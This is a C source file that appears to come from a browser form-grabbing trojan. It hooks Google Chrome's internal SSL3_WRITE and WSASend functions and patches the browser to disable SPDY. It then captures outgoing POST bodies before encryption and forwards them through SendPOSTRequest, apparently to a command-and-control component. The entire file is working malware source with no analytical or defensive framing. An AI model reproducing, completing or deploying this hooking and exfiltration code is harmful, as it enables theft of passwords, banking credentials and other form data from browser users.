#include <Windows.h>
#include <WinInet.h>
#include "CommandControl.h"
#include "Chrome.h"
#include "Chrome Scanner.h"
#include "Chrome Socket Handler.h"
#include "HTTP Parse.h"
#include "C Runtime.h"
#include "Hook Engine.h"


CHROMEMETHODS sChromeMethods;
PSSL3_WRITE SSL3_WRITE = 0;
PWSASEND WSASENDCHROME = 0;
CRITICAL_SECTION Section;


int WINAPI CHROMEWSACALLBACK(_In_   SOCKET s, _In_   LPWSABUF lpBuffers, _In_   DWORD dwBufferCount,_Out_  LPDWORD lpNumberOfBytesSent,_In_   DWORD dwFlags, _In_   void* lpOverlapped,_In_  void* lpCompletionRoutine)
{

	int Result = WSASENDCHROME(s,lpBuffers,dwBufferCount,lpNumberOfBytesSent,dwFlags,lpOverlapped,lpCompletionRoutine);
	if (Result == 0)
	{
		DWORD i = 0;
		for (i = 0; i < dwBufferCount;i++)
		{
			LPWSABUF PBUFFERS = (LPWSABUF)((DWORD)lpBuffers + (i*sizeof(WSABUF)));
			ProcessHeader(PBUFFERS->buf,PBUFFERS->len, "Google Chrome",0,0,"WSASEND");
		}
	}
	return Result;
}


int CHROMECALLBACK(void*fd,const void *buf,int amount)
{
	int Total = SSL3_WRITE(fd,buf,amount);
	if (Total == amount)
	{
		
		if(isPostData((PCHAR)buf))
		{
			PCHAR Host = (PCHAR)HeapAlloc(GetProcessHeap(),0,MAX_PATH);
			if (Host)
			{
				RtlSecureZeroMemory(Host, MAX_PATH);
				if (ProcessHeader((PCHAR)buf, amount, "Google Chrome", Host,MAX_PATH,"SSL_WRITE") == -1)
				{
					PCHROMESOCKET NewSocket = InsertSocket((SOCKET)fd, &Section);
			       

					if (NewSocket)
						NewSocket->szHost = Host;
					else
						HeapFree(GetProcessHeap(),0,Host);
				
				}
				else
				{
				
					HeapFree(GetProcessHeap(),0,Host);
				}

			}
		}
		else
		{
		
			PCHROMESOCKET Socket = FindSocket((SOCKET)fd, &Section);


			if (Socket)
			{

				PCHAR szData = (PCHAR)HeapAlloc(GetProcessHeap(),0,amount+1);
				if (szData)
				{
					RtlSecureZeroMemory(szData,amount+1);
					m_memcpy(szData,buf,amount);
					if (Socket->szHost)
					{
						
						SendPOSTRequest("Google Chrome",Socket->szHost,strlen(Socket->szHost),"SSL_WRITE 2",strlen("SSL_WRITE 2"),szData,strlen(szData));
						HeapFree(GetProcessHeap(),0,Socket->szHost);
						Socket->szHost = 0;
					}
					RemoveSocket((SOCKET)fd, &Section);
					HeapFree(GetProcessHeap(),0,szData);
				}
			}
		}
		
	}
	return Total;
}

VOID ChromeEntry()
{
	RtlSecureZeroMemory(&sChromeMethods, sizeof(CHROMEMETHODS));
	sChromeMethods.SSL_WRITE =  FindChromeSSL();
	sChromeMethods.SPDY_ENABLED = FindChromeSPDY();
	sChromeMethods.WSASEND = FindWSASend();

	RtlSecureZeroMemory(&Section, sizeof(CRITICAL_SECTION));

	InitializeCriticalSection(&Section);

	if (sChromeMethods.SPDY_ENABLED)
	{
		*(PUCHAR)(sChromeMethods.SPDY_ENABLED) = 0x00;
	}

	if (sChromeMethods.SSL_WRITE)
	{

		SSL3_WRITE = (PSSL3_WRITE)SetHook(CHROMECALLBACK,(LPVOID)sChromeMethods.SSL_WRITE);
	}

	if (sChromeMethods.WSASEND)
	{
		WSASENDCHROME = (PWSASEND)SetHook(CHROMEWSACALLBACK,(LPVOID)sChromeMethods.WSASEND);
	}
}